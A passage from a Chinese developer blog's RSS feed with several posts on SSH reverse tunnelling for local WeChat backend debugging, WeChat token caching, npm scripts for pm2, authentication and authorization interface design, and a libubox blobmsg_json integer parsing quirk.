微信公众后台开发要求开发者有外网可访问的 Web 服务，且运行在标准端口（http 80、https 443）。
</p>
</div>
</div>

<div id="outline-container-org0256c76" class="outline-2">
<h2 id="org0256c76">本地开发方案</h2>
<div class="outline-text-2" id="text-org0256c76">
<p>
采用 ssh 端口远程转发，将远程服务器上 80 端口的流量通过已建立的 ssh 连接转发到本地机器的任意端口。
</p>

<p>
因此要求远程服务器上 80 端口不能跑其它服务，有 root 帐号，有独立的外网 IP。
</p>

<p>
可以考虑花几十块买一个 VPS，开发过程中用一下。
</p>

<ul class="org-ul">
<li><p>
参考
</p>

<p>
<a href="http://blog.csdn.net/a351945755/article/details/21785647">SSH的端口转发:本地转发Local Forward和远程转发Remote Forward - 明明 - 博客频道 - CSDN.NET</a>
</p>

<p>
<a href="https://www.zhihu.com/question/25456655">微信开发如何做本地调试？ - 知乎</a>
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org3c189fa" class="outline-2">
<h2 id="org3c189fa">远程服务器配置</h2>
<div class="outline-text-2" id="text-org3c189fa">
<p>
假定服务器的操作系统为 <code>CentOS</code> 。
</p>
</div>

<div id="outline-container-org24bd9f7" class="outline-3">
<h3 id="org24bd9f7">开启 ssh 远程转发</h3>
<div class="outline-text-3" id="text-org24bd9f7">
<p>
修改 <code>/etc/ssh/sshd_config</code> ，添加以下配置
</p>

<pre class="example">
GatewayPorts yes
</pre>

<p>
重启 sshd 服务
</p>

<div class="org-src-container">
<pre class="src src-sh">/etc/init.d/sshd restart
</pre>
</div>

<ul class="org-ul">
<li><p>
参考 <code>man 1 ssh</code>
</p>

<blockquote>
<p>
By default, TCP listening sockets on the server will be bound to the loopback interface only.
This may be overridden by specifying a bind_address.
An empty bind_address, or the address ‘*’, indicates that the remote socket should listen on all interfaces.
Specifying a remote bind_address will only succeed if the server's GatewayPorts option is enabled (see sshd_config(5)).
</p>
</blockquote></li>
</ul>
</div>
</div>

<div id="outline-container-orga43ef0f" class="outline-3">
<h3 id="orga43ef0f">对外开放 80 端口</h3>
<div class="outline-text-3" id="text-orga43ef0f">
<div class="org-src-container">
<pre class="src src-sh">/sbin/iptables -I INPUT -p tcp --dport 80 -j ACCEPT
/etc/init.d/iptables save
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-orgbc93afa" class="outline-2">
<h2 id="orgbc93afa">本地机器配置</h2>
<div class="outline-text-2" id="text-orgbc93afa">
</div>
<div id="outline-container-org2027e01" class="outline-3">
<h3 id="org2027e01">建立 SSH 隧道</h3>
<div class="outline-text-3" id="text-org2027e01">
<p>
假设远程服务器外网 IP 为 <code>x.x.x.x</code> 、ssh 端口为 <code>27906</code> ，本地机器的 Web 服务监听在 <code>8001</code> 端口
</p>

<div class="org-src-container">
<pre class="src src-sh">ssh -C -f -N -g -v -R :80:127.0.0.1:8001 root@x.x.x.x -p 27906
</pre>
</div>

<p>
命令选项请参考 <code>man 1 ssh</code> 。
</p>
</div>
</div>

<div id="outline-container-orgb26aa51" class="outline-3">
<h3 id="orgb26aa51">启动本地 Web 服务</h3>
<div class="outline-text-3" id="text-orgb26aa51">
<p>
在 <code>8001</code> 端口上运行 web 服务。
</p>
</div>
</div>
</div>

<div id="outline-container-org01eddc8" class="outline-2">
<h2 id="org01eddc8">测试访问</h2>
<div class="outline-text-2" id="text-org01eddc8">
<div class="org-src-container">
<pre class="src src-sh">curl http://x.x.x.x/
</pre>
</div>

<p>
应该会响应本地机器上 <a href="http://localhost:8001">http://localhost:8001</a> 的内容了。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[微信公众号后台开发需要缓存的凭据]]></title>
            <link>/article/5fae4fe1516c4f1753f7540e53f05f0053d1970089817f135b58768451ed636e.html</link>
            <guid>/article/5fae4fe1516c4f1753f7540e53f05f0053d1970089817f135b58768451ed636e.html</guid>
            <pubDate>Mon, 10 Apr 2017 10:03:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
根据《<a href="https://mp.weixin.qq.com/wiki/7/85eff372c164ddc66c47777dc972279f.html">接口频率限制说明 - 微信公众平台开发者文档</a>》，很多接口（API）都有调用次数限制，凭据（Token）使用过程中需注意超时、刷新。对这些凭据进行缓存一方面可以避免超出限制被平台拒绝服务，减少微信公众号接口调用次数也能够减少服务响应时间。
</p>

<div id="outline-container-orgf4be799" class="outline-2">
<h2 id="orgf4be799">全局接口调用凭据</h2>
<div class="outline-text-2" id="text-orgf4be799">
<p>
根据《<a href="https://mp.weixin.qq.com/wiki/14/9f9c82c1af308e3b14ba9b973f99a8ba.html">获取access token - 微信公众平台开发者文档</a>》中的描述，全局接口调用凭据有以下特性：
</p>


<ul class="org-ul">
<li><p>
每日调用次数限制
</p>

<p>
新注册帐号每日 2000 次，认证服务号每日 100000 次。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
过期时间限制
</p>

<p>
当前为 7200 秒
</p></li>
</ul>


<ul class="org-ul">
<li><p>
过期前需重新获取（刷新）
</p>

<p>
旧凭据会失效，刷新过程中公众平台会保证新、旧凭据短时间内同时可用。
</p></li>
</ul>


<p>
后台服务往往有多个，而且会多机器、多进程方式部署，所以必须全局缓存该凭据，如使用 <code>Redis</code> 或 <code>Memcached</code> 来缓存；如果每一处业务代码发现凭据过期时擅自去重新获取凭据，高并发情况下可能瞬间出现大量的刷新操作，导致超出每日的接口调用次数限制，最好由一个中控服务负责凭据的管理，其它业务服务需要凭据时访问中控服务，由中控服务来负责凭据的获取、刷新。
</p>
</div>
</div>


<div id="outline-container-org9d15d3f" class="outline-2">
<h2 id="org9d15d3f">微信网页授权凭据</h2>
<div class="outline-text-2" id="text-org9d15d3f">
<p>
根据《 <a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421140183&amp;token=&amp;lang=zh_CN">微信公众平台-微信网页授权</a> 》中的描述，网页授权接口调用凭据有以下特性：
</p>


<ul class="org-ul">
<li><p>
每日调用次数限制
</p>

<p>
无
</p></li>
</ul>


<ul class="org-ul">
<li><p>
过期时间限制
</p>

<p>
当前为 7200 秒
</p></li>
</ul>


<ul class="org-ul">
<li>过期前需重新刷新</li>
</ul>


<p>
网页授权凭据是通过用户授权码（ <code>code</code> ）换取的，用户授权码是一次性的，与用户的后继会话交互要依赖该授权凭据（Token）。后台服务往往有多个，而且会多机器、多进程方式部署，所以必须全局缓存该凭据，并在过期前刷新该凭据。
</p>
</div>
</div>


<div id="outline-container-org1534971" class="outline-2">
<h2 id="org1534971">微信JS接口的临时票据</h2>
<div class="outline-text-2" id="text-org1534971">
<p>
根据《<a href="https://mp.weixin.qq.com/wiki?action=doc&amp;id=mp1421141115&amp;t=0.5032559735352876#fl1">S-SDK使用权限签名算法-获取jsapi_ticket</a> 》中的描述，微信JS接口的临时票据有以下特性：
</p>


<ul class="org-ul">
<li><p>
每日调用次数限制
</p>

<p>
认证服务号每日 1000000 次
</p></li>
</ul>


<ul class="org-ul">
<li><p>
过期时间限制
</p>

<p>
当前为 7200 秒
</p></li>
</ul>


<ul class="org-ul">
<li>过期前需重新获取（刷新）</li>
</ul>


<p>
后台服务往往有多个，而且会多机器、多进程方式部署，所以必须全局缓存该凭据，并在过期前重新获取。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[玩具项目]]></title>
            <link>/article/73a95177987976ee.html</link>
            <guid>/article/73a95177987976ee.html</guid>
            <pubDate>Sat, 21 Jan 2017 15:11:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
有一天，你接到一项任务，开发一个系统，这个系统被要求尽快上线，就像众多的其它项目一样，鲜明的互联网风格，快速开发、快速上线。
</p>

<p>
你照做了，用最擅长的技术，大量重用以前项目里的东西，顺利地在截止日期前将系统写好并上线。
</p>

<p>
它看起来有点粗糙，谈不上高性能、高可用、可扩展这些特性，一句话“Just works”。
</p>

<p>
我们很忙，时间很宝贵，现在就为尚不存在的大量用户去做优化是不值得的，我们还有很多这种项目要做，我们信奉“不要过早优化”以及“尽早发布”。
</p>

<p>
在互联网行业，上个首页后用户量暴增服务被压垮，并不罕见，是一个幸福的烦恼，我们的服务会及时演进，最终，拥有完美的代码和架构。
</p>

<p>
而且不那么忙的时候，我们会静下心来偿还技术债务的，现在已经足够好了，让我们想想还有什么新项目可以做做。
</p>


<p>
时间一天天过去，程序员长成了架构师，小王变成了老王。
</p>

<p>
每一年都有新的产品走红，小公司变成独角兽，每一次业内会议上都会有大量架构演进的分享。
</p>

<p>
或许下一次就轮到我们了，我们会跟着公司一起成长，在业务突飞猛进的情况下，不断打磨我们的技术，我们的程序会从一个个小玩具进化变成高楼大厦。
</p>


<p>
所以我们现在还是玩具人生，在别人眼里，我们是一个问号，有待证明的问号。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用 npm scripts 统一操作接口]]></title>
            <link>/article/4f7f7528-npm-scripts-7edf4e0064cd4f5c63a553e3.html</link>
            <guid>/article/4f7f7528-npm-scripts-7edf4e0064cd4f5c63a553e3.html</guid>
            <pubDate>Thu, 01 Dec 2016 04:10:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
任何一个 Node.js 应用都会有一些基本的操作，如
</p>

<ul class="org-ul">
<li><p>
启动服务
</p>

<p>
./start.sh 或 systemctl start &lt;service&gt; 或 pm2 start app.json &#x2026;
</p></li>

<li><p>
停止服务
</p>

<p>
./stop.sh 或 systemctl stop &lt;service&gt; 或 pm2 stop app.json &#x2026;
</p></li>

<li><p>
重启服务
</p>

<p>
./restart.sh 或 systemctl restart &lt;service&gt; 或 pm2 restart app.json &#x2026;
</p></li>

<li><p>
执行任务脚本
</p>

<p>
node ./tools/qps.js 或 ./tools/qps.sh
</p></li>
</ul>


<p>
我们可能会使用 <a href="https://github.com/Unitech/pm2">pm2</a> 来管理服务，使用 node 来执行脚本，服务往往会依赖一些环境变量的正确定义，如：
</p>

<ul class="org-ul">
<li><p>
PATH
</p>

<p>
同一机器可能跑了多个服务，而每个服务使用不同的 node.js 版本，通过设置 <code>PATH</code> 环境变量来决定使用哪个版本的 node.js。
</p></li>

<li><p>
NODE_ENV
</p>

<p>
值为 <code>production</code> 表示运行在产品环境。
</p>

<p>
值为 <code>development</code> 表示运行在开发环境。
</p>

<p>
如果忘记设置 <code>NODE_ENV</code> 而导致在线上机器使用开发环境运行服务，后果会很严重。
</p></li>

<li><p>
PM2_HOME
</p>

<p>
<a href="https://github.com/Unitech/pm2">pm2</a> 会在 <code>PM2_HOME</code> （默认为当前用户的 HOME 目录） 目录下存放元数据，服务总是以特定的帐号（如：root）运行，线上机器往往会有多个帐号，
当我们以非服务帐号登录系统，并使用 <a href="https://github.com/Unitech/pm2">pm2</a> 管理我们的服务进程时，就可能以错误的帐号重复运行我们的服务。
</p></li>

<li><p>
NODE_CONFIG_DIR
</p>

<p>
<a href="https://github.com/lorenwest/node-config">config</a> 模块用于指定配置文件存放路径，同时它也会使用 <code>NODE_ENV</code> 环境变量来决定载入哪些配置文件。
</p></li>
</ul>


<p>
所以我们可能会写一大堆脚本，如：
</p>

<ul class="org-ul">
<li><p>
.bashrc
</p>

<p>
设置环境变量，由于一台机器上可能跑多个服务，而每个服务的环境设置会不一样，所以我们不好直接放置在用户根目录下的 <code>.bashrc</code> 中。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
.bashrc.$HOSTNAME
</p>

<p>
机器特定的环境变量，用于覆盖默认设置
</p></li>
</ul>


<ul class="org-ul">
<li><p>
start.sh
</p>

<p>
会先载入 .bashrc 中定义的环境变量，再使用 <code>pm2 start &lt;app&gt;</code> 启动服务
</p></li>

<li><p>
stop.sh
</p>

<p>
会先载入 .bashrc 中定义的环境变量，再使用 <code>pm2 stop &lt;app&gt;</code> 停止服务
</p></li>

<li><p>
restart.sh
</p>

<p>
会先载入 .bashrc 中定义的环境变量，再使用 <code>pm2 restart &lt;app&gt;</code> 重启服务
</p></li>

<li><p>
pm2.sh
</p>

<p>
会先载入 .bashrc 中定义的环境变量，再使用用户传入的参数执行 <code>pm2</code>
</p></li>

<li><p>
node.sh
</p>

<p>
会先载入 .bashrc 中定义的环境变量，再使用用户传入的参数执行 <code>node</code>
</p></li>
</ul>


<p>
还有一堆 js 任务脚本，你得决定要不要提供配套的 bash 脚本（确保载入 .bashrc），或者祈祷运行前操作人员会记得先载入 <code>.bashrc</code> 。
</p>


<p>
npm scripts 相关文章
</p>

<ul class="org-ul">
<li><a href="https://medium.freecodecamp.com/why-i-left-gulp-and-grunt-for-npm-scripts-3d6853dd22b8#.a0ulmy8bk">Why I Left Gulp and Grunt for npm Scripts</a></li>
</ul>


<ul class="org-ul">
<li><a href="http://www.ruanyifeng.com/blog/2016/10/npm_scripts.html">npm scripts 使用指南 - 阮一峰的网络日志</a></li>
</ul>



<p>
npm scripts 使用的是 shell 命令，npm scripts 的强大其实是 shell scripts 的强大，npm scripts 只是约定了统一的入口也就是操作界面。
</p>

<p>
npm scripts 示例如下：
</p>

<div class="org-src-container">
<pre class="src src-json"><span style="color: #b5bd68;">"scripts"</span>: {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"node"</span>: <span style="color: #8abeb7;">"export NODE_ENV=${NODE_ENV:-production}; node"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"pm2"</span>: <span style="color: #8abeb7;">"export NODE_ENV=${NODE_ENV:-production}; PM2=pm2; PM2_USER=${PM2_USER:</span><span style="color: #8abeb7; text-decoration: underline;">-root}; [[ $HOME != `echo ~$PM2_USER` ]] &amp;&amp; PM2=\"sudo -u $PM2_USER pm2\"; $PM2"</span><span style="text-decoration: underline;">,</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"ps"</span>: <span style="color: #8abeb7;">"npm run pm2 -- list $npm_package_name"</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"prestart"</span>: <span style="color: #8abeb7;">"STARTED=`npm -s run pm2 -- jlist | json -a -c \"this.name == '$np</span><span style="color: #8abeb7; text-decoration: underline;">m_package_name' &amp;&amp; ['errored', 'stopped'].indexOf(this.pm2_env.status) == -1\" pm2_env.pm_id | wc -l`; [[ $STARTED &gt; 0 ]] &amp;&amp; echo $STARTED process already running; exit $STARTED"</span><span style="text-decoration: underline;">,</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"start"</span>: <span style="color: #8abeb7;">"PM2_FILE=./process.json; [[ -f ./process.${HOSTNAME}.json ]] &amp;&amp; PM2_</span><span style="color: #8abeb7; text-decoration: underline;">FILE=./process.${HOSTNAME}.json; npm run pm2 -- start $PM2_FILE"</span><span style="text-decoration: underline;">,</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"stop"</span>: <span style="color: #8abeb7;">"PM2_FILE=./process.json; [[ -f ./process.${HOSTNAME}.json ]] &amp;&amp; PM2_F</span><span style="color: #8abeb7; text-decoration: underline;">ILE=./process.${HOSTNAME}.json; npm run pm2 -- stop $PM2_FILE"</span><span style="text-decoration: underline;">,</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">"restart"</span>: <span style="color: #8abeb7;">"PM2_FILE=./process.json; [[ -f ./process.${HOSTNAME}.json ]] &amp;&amp; PM</span><span style="color: #8abeb7; text-decoration: underline;">2_FILE=./process.${HOSTNAME}.json; npm run pm2 -- startOrGracefulReload $PM2_FILE"</span>
}
</pre>
</div>

<p>
运行 npm scripts：
</p>

<ul class="org-ul">
<li><p>
<code>npm run</code>
</p>

<p>
列出所有脚本。
</p></li>

<li><p>
<code>npm run pm2 -- list</code>
</p>

<p>
执行 <code>pm2 list</code> ，会确保正确设置环境变量，并且必要时切换到 pm2 帐号。
</p></li>

<li><p>
<code>npm start</code>
</p>

<p>
执行 <code>pm2 start</code> ，会确保正确设置环境变量，并且必要时切换到 pm2 帐号，通过 <code>prestart</code> 预先检查进程是否已启动，避免重启服务。
</p></li>

<li><p>
<code>npm run node -- tools/qps.js</code>
</p>

<p>
执行 <code>node tools/qps.js</code> ，会确保正确设置环境变量。
</p></li>
</ul>


<p>
npm scripts 会自动将 ./node_modules/.bin 添加到 $PATH 环境变量，将 <code>package.json</code> 的内容暴露成环境变量供脚本引用，通过 <code>pre</code> 及 <code>post</code> 钩子自动执行前置/后置附带任务，通过在脚本中调用其它 npm scripts 脚本也可以简化脚本的开发。
</p>


<p>
现在我们只有 npm scripts，所有的一切操作都从 npm run 开始，整个世界清净了。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[概念设计：认证（Authentication）与授权（Authorization）]]></title>
            <link>/article/69825ff58bbe8ba1ff1a8ba48bc1ff08-authentication-ff094e0e63886743ff08-authorization-ff09.html</link>
            <guid>/article/69825ff58bbe8ba1ff1a8ba48bc1ff08-authentication-ff094e0e63886743ff08-authorization-ff09.html</guid>
            <pubDate>Wed, 30 Nov 2016 06:33:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org84bfc7f" class="outline-2">
<h2 id="org84bfc7f">认证（Authentication）</h2>
<div class="outline-text-2" id="text-org84bfc7f">
<p>
验证我是谁。
</p>
</div>
</div>

<div id="outline-container-org91c1dbc" class="outline-2">
<h2 id="org91c1dbc">授权（Authorization）</h2>
<div class="outline-text-2" id="text-org91c1dbc">
<p>
在认证（Authorization）后，验证我被允许做什么。
</p>
</div>
</div>

<div id="outline-container-org0b61963" class="outline-2">
<h2 id="org0b61963">认证（Authentication）接口原型</h2>
<div class="outline-text-2" id="text-org0b61963">
<div class="org-src-container">
<pre class="src src-c"><span style="color: #b294bb;">/**</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* Authenticate user identification.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@param</span><span style="color: #b294bb;"> name - User name.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@param</span><span style="color: #b294bb;"> secret - Secret known only to the user.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@return</span><span style="color: #b294bb;"> Returns authenticated user.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #81a2be;">User</span> <span style="color: #de935f;">authenticate</span>(<span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">name</span>, <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">secret</span>)
</pre>
</div>

<dl class="org-dl">
<dt><code>authenticate</code></dt><dd>验证用户身份</dd>
</dl>
</div>
</div>

<div id="outline-container-org5ce5c1b" class="outline-2">
<h2 id="org5ce5c1b">授权（Authorization）接口原型</h2>
<div class="outline-text-2" id="text-org5ce5c1b">
<div class="org-src-container">
<pre class="src src-C"><span style="color: #b294bb;">/**</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* Authorize user to do operation.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@param</span><span style="color: #b294bb;"> user - User to authorize.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@param</span><span style="color: #b294bb;"> Operation - Operation to authorize.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #81a2be;">void</span> <span style="color: #de935f;">authorize</span>(<span style="color: #81a2be;">User</span> <span style="color: #f0c674;">user</span>, <span style="color: #81a2be;">Operation</span> <span style="color: #f0c674;">operation</span>);

<span style="color: #b294bb;">/**</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* Deauthorize user to do operation.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@param</span><span style="color: #b294bb;"> user - User to deauthorize.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@param</span><span style="color: #b294bb;"> operation - Operation to deauthorize.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #81a2be;">void</span> <span style="color: #de935f;">deauthorize</span>(<span style="color: #81a2be;">User</span> <span style="color: #f0c674;">user</span>, <span style="color: #81a2be;">Operation</span> <span style="color: #f0c674;">operation</span>);

<span style="color: #b294bb;">/**</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* Is user authorized to do operation.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@param</span><span style="color: #b294bb;"> user - User to check.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@param</span><span style="color: #b294bb;"> operation - Operation to check.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* </span><span style="color: #81a2be;">@return</span><span style="color: #b294bb;"> Is authorized or not.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #81a2be;">bool</span> <span style="color: #de935f;">authorized</span>(<span style="color: #81a2be;">User</span> <span style="color: #f0c674;">user</span>, <span style="color: #81a2be;">Operation</span> <span style="color: #f0c674;">operation</span>);
</pre>
</div>

<dl class="org-dl">
<dt><code>authorize</code></dt><dd>允许用户操作</dd>
</dl>


<dl class="org-dl">
<dt><code>deauthorize</code></dt><dd>禁止用户操作</dd>
</dl>


<dl class="org-dl">
<dt><code>authorized</code></dt><dd>检查用户是否允许操作</dd>
</dl>
</div>
</div>

<div id="outline-container-org572274f" class="outline-2">
<h2 id="org572274f">参考</h2>
<div class="outline-text-2" id="text-org572274f">
<ul class="org-ul">
<li><a href="https://www.cyberciti.biz/faq/authentication-vs-authorization/">What Is The Difference Between Authentication And Authorization?</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[blobmsg_json 只支持一种整型]]></title>
            <link>/article/blobmsg_json-53ea652f63014e0079cd6574578b.html</link>
            <guid>/article/blobmsg_json-53ea652f63014e0079cd6574578b.html</guid>
            <pubDate>Mon, 31 Oct 2016 12:23:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在使用 ubus 时，发现 <code>blobmsg_policy</code> 中使用 <code>BLOBMSG_TYPE_INT64</code> 或 <code>BLOBMSG_TYPE_INT16</code> 类型后， <code>ubus list -v</code> 显示的参数类型为 <code>(unknown)</code> ， <code>blobmsg_parse</code> 解析请求相应字段为 <code>NULL</code> ，如下例所示
</p>

<p>
<code>blobmsg_json_test.c</code>
</p>
<div class="org-src-container">
<pre class="src src-C"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;libubox/blobmsg_json.h&gt;</span>

<span style="color: #b5bd68;">static</span> <span style="color: #b5bd68;">const</span> <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">blobmsg_policy</span> <span style="color: #f0c674;">policy</span>[] = {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> [0] = { .name = <span style="color: #8abeb7;">"name"</span>, .type = BLOBMSG_TYPE_STRING },
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> [1] = { .name = <span style="color: #8abeb7;">"length"</span>, .type = BLOBMSG_TYPE_INT64 },
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> [2] = { .name = <span style="color: #8abeb7;">"width"</span>, .type = BLOBMSG_TYPE_INT16 },
};

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">json</span> = <span style="color: #8abeb7;">"{\"name\":\"tree\", \"length\": 100000000, \"width\": 10</span><span style="color: #8abeb7; text-decoration: underline;">}"</span><span style="text-decoration: underline;">;</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">blob_buf</span> <span style="color: #f0c674;">buf</span> = {<span style="color: #8abeb7;">'\0'</span>};
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> blobmsg_buf_init(&amp;buf);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span> blobmsg_add_json_from_string(&amp;buf, json)) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"load json to blob buf failed\n"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> EXIT_FAILURE;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">blob_attr</span> *<span style="color: #f0c674;">attr</span>[ARRAY_SIZE(<span style="color: #81a2be;">policy</span>)];
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (0 != blobmsg_parse(policy, ARRAY_SIZE(policy), attr, blob_data(buf.head)<span style="text-decoration: underline;">, blob_len(buf.head))) {</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"parse failed\n"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> EXIT_FAILURE;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">i</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">for</span>(i = 0; i &lt; ARRAY_SIZE(policy); ++i) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span> attr[i]) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> fprintf(stderr, <span style="color: #8abeb7;">"parse failed: %s\n"</span>, policy[i].name);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> }

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> EXIT_SUCCESS;
}
</pre>
</div>

<p>
运行结果
</p>
<pre class="example">
$ ./blobmsg_json_test
parse failed: length
parse failed: width
</pre>

<p>
